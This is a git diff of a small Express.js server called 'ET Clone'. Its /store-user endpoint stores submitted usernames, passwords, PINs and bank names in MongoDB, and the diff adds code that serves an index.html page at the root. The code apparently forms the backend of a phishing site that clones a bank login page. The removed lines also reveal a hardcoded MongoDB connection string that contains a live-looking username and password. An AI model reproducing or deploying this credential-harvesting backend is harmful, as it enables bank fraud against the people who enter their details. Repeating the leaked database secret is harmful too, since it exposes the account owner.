@@ -1,13 +1,12 @@
 const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
+const path = require("path");
 const { MongoClient } = require("mongodb");
 
 const app = express();
-
-// Use environment variables for sensitive information
-const PORT = process.env.PORT || 3002; // Use the Render-provided port or default to 3002
-const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://emily:0505Maor2005@et-clone-live.vapnp4e.mongodb.net/?retryWrites=true&w=majority&appName=ET-Clone-Live";
+const PORT = process.env.PORT || 3002; // Use Render's provided port or fallback to 3002
+const MONGO_URI = process.env.MONGO_URI || "your_mongodb_connection_string";
 
 const client = new MongoClient(MONGO_URI);
 let db;
@@ -27,11 +26,14 @@ connectToDatabase();
 
 // Middleware
 app.use(bodyParser.json());
-app.use(cors()); // Enable CORS
+app.use(cors());
 
-// Root route to serve a message (optional)
+// Serve static files from the current directory
+app.use(express.static(path.join(__dirname)));
+
+// Serve `index.html` for the root route
 app.get("/", (req, res) => {
-    res.send("Welcome to the ET Clone API");
+    res.sendFile(path.join(__dirname, "index.html"));
 });
 
 // API Endpoint to Store User Data
@@ -48,7 +50,7 @@ app.post("/store-user", async (req, res) => {
             username,
             password,
             pin,
-            bankName, // Save bank name
+            bankName,
             createdAt: new Date(),
         });
         res.status(201).send("User data saved successfully!");
@@ -58,7 +60,7 @@ app.post("/store-user", async (req, res) => {
     }
 });
 
-// Start the Server
+// Start the server
 app.listen(PORT, () => {
     console.log(`Server running at http://localhost:${PORT}`);
 });
